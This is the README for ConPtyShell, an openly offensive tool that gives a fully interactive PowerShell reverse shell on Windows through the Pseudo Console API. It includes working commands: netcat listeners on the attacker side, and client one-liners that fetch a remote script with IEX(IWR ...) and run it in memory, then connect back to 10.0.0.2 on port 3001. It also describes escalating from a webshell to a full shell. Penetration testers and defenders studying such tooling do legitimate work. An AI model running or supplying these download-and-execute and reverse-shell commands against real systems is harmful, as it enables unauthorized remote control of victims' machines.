# ConPtyShell
ConPtyShell is a Fully Interactive Reverse Shell for Windows systems.

The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.
ConPtyShell uses this feature to literally transform your bash in a remote powershell.

<p>Briefly, it creates a Pseudo Console and attaches 2 pipes.<br>
Then it creates the shell process (default powershell.exe) attaching the Pseudo Console with redirected input/output.<br>
Then starts 2 Threads for Async I/O:<br>
- one thread for reading from the socket and writing to Pseudo Console input pipe;<br>
- the second thread for reading from the Pseudo Console output pipe and writing to the socket.</p>

ConPtyShell isn't an "Upgrade to fully interactive" method for your reverse shell, just use it as your reverse shell :)

If you want to know further information regarding ConPty you can find a great article [1] in the references section.

**NOTE: ConPtyShell uses the function <a href="https://docs.microsoft.com/en-us/windows/console/createpseudoconsole">CreatePseudoConsole()</a>. This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**

**NOTE2: If the ConPTY is not available on the target system you will get a normal netcat-like interactive shell.**

## Requirements
<p>Client Side: Windows version >= 10 / 2019 1809 (build >= 10.0.17763)</p>
<p>Server Side: any tcp listener, i.e. netcat</p>

## Usage

It's important to have the same rows and cols size between your terminal and the remote terminal if you want to have an aligned output on the shell.

#### Method 1
In this method the terminal size is set without you pass the rows and cols parameters to Invoke-ConPtyShell function:

##### Server Side:
```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

##### Client Side:

```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

or, if you upload the ps1:

```
IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell 10.0.0.2 3001
```

#### Method 2
If you prefer to have more freedom on the tcp listener and your terminal you can proceed with a "Manual" way to get the reverse shell. In this case it's important that you set rows and cols size when calling the Invoke-ConPtyShell function:

##### Server Side:
```
stty size
nc -lvnp 3001
Wait For connection
ctrl+z
stty raw -echo
fg[ENTER]
```
##### Client Side:
Here you should use the values read from ```stty size``` command in the Parameters -Rows and -Cols
```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 24 -Cols 80
```

or, if you upload the ps1:

```
IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 24 -Cols 80
```

#### Change Console Size

In any case if you resize your terminal while you have already open the remote shell you can change the rows and cols size directly from powershell pasting the following code:

```
$width=80
$height=24
$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
```

## Demo
Below in the video you can watch a simulated scenario where on the left terminal i have a limited access to the server through a webshell and on the right i spawn a fully interactive reverse shell playing around:

<img src="https://drive.google.com/uc?id=1xPfNYjhTI5LpovDIustGxkzjNNg2Hc6l">

## References

1. https://devblogs.microsoft.com/commandline/windows-command-line-introducing-the-windows-pseudo-console-conpty/
2. https://github.com/microsoft/terminal

## Credits

- LupMan
